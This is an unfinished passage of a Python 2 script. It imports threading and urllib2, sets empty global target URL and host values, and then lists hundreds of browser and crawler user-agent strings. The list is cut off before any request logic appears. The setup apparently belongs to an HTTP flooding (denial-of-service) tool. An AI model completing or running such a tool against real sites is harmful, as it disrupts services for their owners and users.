import urllib2
import sys
import threading
import random
import re

#global params
url=''
host=''
headers_useragents=["Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36",
      "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
      "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0",
      "Mozilla/5.0 (X11; OpenBSD amd64; rv:28.0) Gecko/20100101 Firefox/28.0",
      "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0",
      "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
      "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0",
      "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
      "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
      "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
      "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
      "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
      "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
      "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
      "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",
      "HTC_Touch_3G Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.11)",
      "Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; Nokia;N70)",
      "Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+",
      "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
      "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.115 Mobile Safari/534.11+",
      "Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
      "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
      "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5",
      "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
      "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
      "Mozilla/5.0 (Windows; U; Windows NT 6.1; tr-TR) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
      "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57",
    "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
    "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0",
    "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g",
    "Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)",
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125",
    "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)",
    "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)",
    "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
    "Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)",
    "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)",
    "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0",
    "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
    "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16",
    "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
    "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
    "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)",
    "Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7",
    "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
    "Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)",
    "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)",
    "Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)",
    "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10",
    "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)",
    "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007",
    "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
    "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
    "Opera/9.20 (Windows NT 6.0; U; en)",
    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
    "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
    "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
    "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
    "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
    "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
    "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
    "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
    "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
    "Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)",
    "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
    "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)",
    "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)",
    "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
        "Links (2.1pre15; FreeBSD 5.4-STABLE i386; 158x58)",
        "Wget/1.8.2",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.0",
        "Mediapartners-Google/2.1",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.5) Gecko/20031007 Firebird/0.7",
        "Mozilla/4.04 [en] (WinNT; I)",
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20060205 Galeon/2.0.0 (Debian package 2.0.0-2)",
        "lwp-trivial/1.41",
        "NetBSD-ftp/20031210",
        "Dillo/0.8.5-i18n-misc",
        "Links (2.1pre20; NetBSD 2.1_STABLE i386; 145x54)",
        "Lynx/2.8.5rel.5 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d",
        "Lynx/2.8.5rel.3 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d",
        "Links (2.1pre19; NetBSD 2.1_STABLE sparc64; 145x54)",
        "Lynx/2.8.6dev.15 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d",
        "Links (2.1pre14; IRIX64 6.5 IP27; 145x54)",
        "Wget/1.10.1",
        "ELinks/0.10.5 (textmode; FreeBSD 4.11-STABLE i386; 80x22-2)",
        "Links (2.1pre20; FreeBSD 4.11-STABLE i386; 80x22)",
        "Lynx/2.8.5rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d-p1",
        "Opera/8.52 (X11; Linux i386; U; de)",
        "Mozilla/5.0 (X11; U; NetBSD i386; en-US; rv:1.8.0.1) Gecko/20060310 Firefox/1.5.0.1",
        "Mozilla/5.0 (X11; U; IRIX64 IP27; en-US; rv:1.4) Gecko/20030711",
        "Mozilla/4.8 [en] (X11; U; IRIX64 6.5 IP27)",
        "Mozilla/4.76 [en] (X11; U; SunOS 5.8 sun4m)",
        "Opera/5.0 (SunOS 5.8 sun4m; U) [en]",
        "Links (2.1pre15; SunOS 5.8 sun4m; 80x24)",
        "Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7d",
        "Wget/1.8.1",
        "Wget/1.9.1",
        "tnftp/20050625",
        "Links (1.00pre12; Linux 2.6.14.2.20051115 i686; 80x24) (Debian pkg 0.99+1.00pre12-1)",
        "Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/1.0.16",
        "Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.7) Gecko/20051122",
        "Wget/1.7",
        "Lynx/2.8.2rel.1 libwww-FM/2.14",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; de) Opera 8.53",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
        "Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7e",
        "Links (2.1pre20; SunOS 5.10 sun4u; 80x22)",
        "Lynx/2.8.5rel.5 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i",
        "Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.8) Gecko/20060202 Firefox/1.5",
        "Opera/8.51 (X11; Linux i386; U; de)",
        "Emacs-W3/4.0pre.46 URL/p4.0pre.46 (i386--freebsd; X11)",
        "Links (0.96; OpenBSD 3.0 sparc)",
        "Lynx/2.8.4rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.6c",
        "Lynx/2.8.3rel.1 libwww-FM/2.14",
        "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "libwww-perl/5.79",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.53",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.12) Gecko/20050919 Firefox/1.0.7",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar)",
        "msnbot/1.0 (+http://search.msn.com/msnbot.htm)",
        "Googlebot/2.1 (+http://www.google.com/bot.html)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051008 Firefox/1.0.7",
        "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; en) Opera 8.51",
        "Mozilla/5.0 (compatible; Konqueror/3.4; Linux) KHTML/3.4.3 (like Gecko)",
        "Lynx/2.8.4rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7c",
        "Mozilla/4.0 (compatible; MSIE 6.0; AOL 9.0; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
        "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
        "Mozilla/4.8 [en] (Windows NT 5.1; U)",
        "Opera/8.51 (Windows NT 5.1; U; en)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
        "Opera/8.51 (Windows NT 5.1; U; en;VWP-online.de)",
        "sproose/0.1-alpha (sproose crawler; http://www.sproose.com/bot.html; crawler@sproose.com)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0",
        "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0,gzip(gfe) (via translate.google.com)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.0; de; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
        "BrowserEmulator/0.9 see http://dejavu.org",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x 4.90)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:0.9.4.1) Gecko/20020508",
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/125.2 (KHTML, like Gecko)",
        "Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.4) Gecko/20030624",
        "iCCrawler (http://www.iccenter.net/bot.htm)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.6) Gecko/20050321 Firefox/1.0.2",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; Maxthon; .NET CLR 1.1.4322)",
        "Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.7.12) Gecko/20051013 Debian/1.7.12-1ubuntu1",
        "Mozilla/5.0 (Windows; U; Windows NT 5.0; de; rv:1.8) Gecko/20051111 Firefox/1.5",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:0.9.4.1) Gecko/20020508 Netscape6/6.2.3",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.50",
        "Mozilla/3.0 (x86 [de] Windows NT 5.0; Sun)",
        "Java/1.4.1_04",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8) Gecko/20051111 Firefox/1.5",
        "msnbot/0.9 (+http://search.msn.com/msnbot.htm)",
        "NutchCVS/0.8-dev (Nutch running at UW; http://www.nutch.org/docs/en/bot.html; sycrawl@cs.washington.edu)",
        "Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; de) Opera 8.53",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.4) Gecko/20030619 Netscape/7.1 (ax)",
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/312.8 (KHTML, like Gecko) Safari/312.6",
        "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)",
        "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0)",
        "Mozilla/4.0 (compatible; MSIE 5.16; Mac_PowerPC)",
        "Mozilla/4.0 (compatible; MSIE 5.01; Windows 98)",
        "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)",
        "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",
        "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 5.0; Windows 95)",
        "Mozilla/4.0 (compatible; MSIE 5.5; AOL 7.0; Windows 98)",
        "Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)",
        "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)",
        "Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)",
        "Opera/8.53 (Windows NT 5.1; U; en)",
        "Opera/8.01 (Windows NT 5.0; U; de)",
        "Opera/8.54 (Windows NT 5.1; U; de)",
        "Opera/8.53 (Windows NT 5.0; U; en)",
        "Opera/8.01 (Windows NT 5.1; U; de)",
        "Opera/8.50 (Windows NT 5.1; U; de)",
        "Mozilla/4.0 (compatible- MSIE 6.0- Windows NT 5.1- SV1- .NET CLR 1.1.4322",
        "Mozilla/4.0(compatible; MSIE 5.0; Windows 98; DigExt)",
        "Mozilla/4.0 (compatible; Cerberian Drtrs Version-3.2-Build-0)",
        "Mozilla/4.0 (compatible; AvantGo 6.0; FreeBSD)",
        "Mozilla/4.5 [de] (Macintosh; I; PPC)",
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; .NET CLR 1.1.4322; MSN 9.0;MSN 9.1; MSNbMSNI; MSNmen-us; MSNcIA; MPLUS)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {59FC8AE0-2D88-C929-DA8D-B559D01826E7}; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; snprtz|S04741035500914#914|isdn; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; EnergyPlugIn; dial)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; iebar; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312461; sbcydsl 3.12; YComp 5.0.0.0; YPC 3.2.0; .NET CLR 1.1.4322; yplus 5.1.02b)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Arcor 5.004; .NET CLR 1.0.3705)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; YComp 5.0.0.0; SV1; .NET CLR 1.0.3705)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Ringo; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; YPC 3.0.1; .NET CLR 1.1.4322; yplus 4.1.00b)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; YPC 3.2.0)",
        "Mozilla/4.0 (compatible; MSIE 6.0; AOL 7.0; Windows NT 5.1; FunWebProducts)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; BUILDWARE 1.6; .NET CLR 1.1.4322)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; HbTools 4.7.5)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; YPC 3.2.0; (R1 1.5)",
        "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; it)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FunWebProducts; SV1)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Arcor 5.004; FunWebProducts; HbTools 4.7.5)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; en)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Tablet PC 1.7)",
